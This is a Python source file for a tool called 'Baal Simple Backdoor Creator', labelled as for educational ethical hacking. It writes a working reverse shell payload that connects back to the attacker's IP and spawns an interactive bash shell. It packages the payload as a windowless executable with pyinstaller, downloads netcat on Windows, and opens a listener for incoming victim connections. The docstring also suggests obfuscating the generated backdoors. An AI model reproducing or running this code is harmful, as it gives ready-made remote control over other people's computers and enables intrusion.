#!/usr/bin/python
import socket
import subprocess
import os
import platform
import wget

# for coloring the terminal
from termcolor import cprint, colored

#for printing arguments help and available options for users
import optparse

'''
Description: This tool is part of the ethical hacking toolset. This tool is for educational use ONLY.
Baal_Simple_Backdoor_Creator.py should be run on the attacker machine ideally it should be a Linux

It is a factory of backdoors. It generates a .py backdoor and an executable depending on the operating 
system you choose. This tool requires pyinstaller to be installed on the target system.

The usage of the Baal Simple Backdoor Creator can be invoked via a -h switch

Requirements: Make sure you install any necessary libraries required by this tool.
per example:  pip install wget

Use the generated backdoors as packaged executables for your OS: Mac OS, Linux and MS Windows. 
Consider using additional obfuscation techniques.

# Usage: 
## Usage 1 (without command line parameters):
python3 Baal_Simple_Backdoor_Creator.py  or ./Baal_Simple_Backdoor_Creator.py 

This will make the tool detect the IP of your machine (i.e attacker IP) and will use default port 2233.
This creator tool in this version use netcat and create a netcat listner on port 2233 executing a command such as:
On Linux: nc -lp 2233
On MacOS: nc -l -p 2233
on Windows, Jon Craton Tool is used: https://joncraton.org/blog/46/netcat-for-windows/

The Baal Simple Backdoor Creator will generate a python backdoor i.e. a backdoor with .py extension. 
The file will be named baal_s.py and an executable which you can find in the dist folder.  
The generated backdoor is automatically configured with the attackers IP.
Enjoy!
'''

default_port = 2233

def display_header():
        cprint(
            """\
  
   ____                 _   ____                _        _                             _____                    _               
 |  _ \               | | |  _ \              | |      | |                           / ____|                  | |              
 | |_) |  __ _   __ _ | | | |_) |  __ _   ___ | | __ __| |  ___    ___   _ __  ___  | |      _ __  ___   __ _ | |_  ___   _ __ 
 |  _ <  / _` | / _` || | |  _ <  / _` | / __|| |/ // _` | / _ \  / _ \ | '__|/ __| | |     | '__|/ _ \ / _` || __|/ _ \ | '__|
 | |_) || (_| || (_| || | | |_) || (_| || (__ |   <| (_| || (_) || (_) || |   \__ \ | |____ | |  |  __/| (_| || |_| (_) || |   
 |____/  \__,_| \__,_||_| |____/  \__,_| \___||_|\_\\__,_| \___/  \___/ |_|   |___/  \_____||_|   \___| \__,_| \__|\___/ |_|   
                                                                                                                               
                                                                                                                               
                                                                                                              
                                                                                                      
                                      
             by Dr. Hussein Bakri\n""", 'green')
        cprint("This tool is licensed under MIT\n",'green')

def detect_my_IP():
    '''Returns a string representation of an IPv4 in the form of X.Y.Z.Q'''
    try: 
        MyHostName = socket.gethostname() 
        My_Private_IPv4 = socket.gethostbyname(MyHostName)
        print("\nDetecting your IP: " + My_Private_IPv4)
        return My_Private_IPv4 
    except: 
        return "127.0.0.1" 
    

def nc(host, port, content):
    # Code taken from stackoverflow
    nc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    nc_socket.connect((host,port))
    nc_socket.sendall(content.encode())
    nc_socket.shutdown(socket.SHUT_WR)

    response = ""
    while True:
        data = nc_socket.recv(4096)
        if not data:
            break
        response += repr(data)
    nc_socket.close()

Backdoor_Simple_Payload = '''
#!/usr/bin/python
import socket
import subprocess
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("'''+ detect_my_IP() +'''", 2233))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/bash", "-i"])
'''

def main():
    display_header()
    parser = optparse.OptionParser('Usage of the program: ' + '-H <target host> -p <target port(s)>')
    parser.add_option('-H', '--ip', dest='attackerHostIP', type='string' , help='specify attacker IP')
    parser.add_option('-p', '--port', dest='listeningPort', type='string' , help='specify a single port to listen on')

    (options, args) = parser.parse_args()
    attackerHostIP = options.attackerHostIP
    listeningPort = options.listeningPort

    if(listeningPort == None):
    	# use default port
        listeningPort = default_port
    
    
    if(attackerHostIP == None) | (listeningPort == None):
        #print(parser.usage)
        # parser.print_help()
        # exit(0)
        attackerHostIP = detect_my_IP()

    # Writing the payload to a .py file
    print("\nWriting the backdoor baal_s.py ----")
    with open('baal_s.py','w') as out:
        out.write(Backdoor_Simple_Payload)

    # Create an executable
    # Run pyinstaller baal_s.py  --onefile --noconsole
    print("\nTransforming the backdoor baal_s.py to an executable----")
    subprocess.run("pyinstaller baal_s.py  --onefile --noconsole", shell=True, check=True)

    # Run netcat to listen for connections from victims
    # run nc -lp 2233
    # checking what OS you are running
    print('\nDetecting what Operating System you are using...')
    if (platform.system() == 'Windows'):
        print('\nYou appear to be on MS Windows machine----')
        print('Downloading the netcat version of Jon Craton-----')
        url = 'https://github.com/HusseinBakri/Baal-Backdoors/blob/master/netcat_executables/nc.exe?raw=true'
        wget.download(url, '.')
        print("\nPlease enable connections to nc.exe in your Windows Firewall dialog box ---")
        subprocess.run("./nc.exe -l -p " +  str(listeningPort), shell=True, check=True)
        
    elif (platform.system() == 'Linux'):
        print('\nYou appear to be on Linux machine.....')
        print('Executing netcat command - listing on port specified: nc -lp '+ str(listeningPort))
        subprocess.run("nc -lp " + str(listeningPort), shell=True, check=True)

    elif (platform.system() == 'Darwin'):
        # you are on a Mac OS
        print('\nYou appear to be on Mac machine.....')
        print('Executing Mac OS netcat command - listing on port specified: nc -l -p '+ str(listeningPort))
        subprocess.run("nc -l -p "+ str(listeningPort), shell=True, check=True)        
    else:
        print('\nUnknown OS...')
        input("Please run yourself netcat accordingly....Exiting")
        exit(0)    


if __name__ == '__main__':
    main()
